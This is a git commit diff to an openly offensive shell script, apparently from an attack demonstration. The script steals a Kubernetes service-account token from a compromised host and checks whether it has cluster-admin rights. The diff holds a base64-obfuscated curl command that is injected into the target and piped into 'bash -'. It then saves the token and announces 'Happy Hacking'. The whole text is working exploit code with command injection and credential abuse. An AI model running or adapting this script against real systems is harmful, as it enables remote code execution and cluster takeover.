a4df4d275662e5783e7055d549fc152b4bcb5d62
Rodrigo Alvares <rodrigo.alvares@outlook.com>
2024-12-11 09:18:59 +0400

    replaced envsubst to sed

--- attack/01_expoit_asset-cache_get_visa_token.sh
+++ attack/01_expoit_asset-cache_get_visa_token.sh
@@ -25,7 +25,8 @@ export hostname_pivot=$(echo ${target_info} | cut -f 1 -d " ")
 function check_token_privileges(){
 export token=$(echo ${target_info} | awk 'NF>1{print $NF}')
 commandb64='Y3VybCAtcyAtayAgXAogICAgIC1IICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIFwKICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJHt0b2tlbn0iIFwKICAgIC1kICd7ImtpbmQiOiJTZWxmU3ViamVjdEFjY2Vzc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJyZXNvdXJjZUF0dHJpYnV0ZXMiOnsidmVyYiI6IioiLCJyZXNvdXJjZSI6IioifX0sInN0YXR1cyI6eyJhbGxvd2VkIjpmYWxzZX19CicgXAogICAgaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzCg=='
-inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
+#inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
+inject=$(echo "${commandb64}" | base64 -d | sed "s/\${token}/$token/g" | base64)
 curl_target $1 "echo '${inject}' | base64 -d | bash -" | grep -i -q 'allowed": true,' &&  echo $token > token && echo " ☣☣☣ Checking Token Privileges ☣☣☣" && echo ☺ - kubernetes.default.svc:443 Access Confirmed from ${hostname} && echo ☺ - Token with cluster-admin Privileges Confirmed && echo ☣☣☣ Happy Hacking ☣☣☣
 if test -f token;then
 echo ""
